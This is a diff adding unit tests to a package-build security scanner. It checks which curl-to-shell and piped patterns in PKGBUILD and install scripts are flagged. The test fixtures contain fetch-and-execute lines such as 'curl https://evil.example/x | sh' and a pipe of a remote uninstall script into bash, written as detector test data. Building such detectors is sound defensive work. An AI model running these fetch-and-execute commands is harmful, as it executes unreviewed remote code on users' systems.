@@ -271,6 +271,53 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Test]
+    public void Quoted_uninstall_instructions_in_scriptlet_do_not_block()
+    {
+        // Help text printed for the user: the pipe sits inside a quoted string, so
+        // nothing is actually piped into a shell.
+        var result = Scan(("foo.install",
+            "post_remove() {\n  echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"\n}\n"));
+
+        Assert.That(
+            result.Findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
+            Is.False);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Perl_release_tag_scraping_does_not_block()
+    {
+        // perl runs its inline -pe program on the download as stdin data; the fetch
+        // itself stays visible as a Medium risky-tool finding.
+        var result = Scan(("aur-cfg.sh",
+            "get_pkgver() {\n  curl -s https://example.com/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'\n}\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "network-execution"), Is.False);
+        Assert.That(result.Findings.Any(f => f.RuleId == "risky-tool"), Is.True);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Answer_feeding_local_installer_does_not_block()
+    {
+        // bash executes the local script file; the piped answer is only its stdin data.
+        var result = Scan(("PKGBUILD", "package() {\n  echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null\n}\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.False);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Network_pipe_inside_quoted_substitution_still_flags()
+    {
+        var result = Scan(("PKGBUILD", "echo \"$(curl https://evil.example/x | sh)\"\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
     public void Non_script_binary_file_is_not_scanned()
     {
         var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));
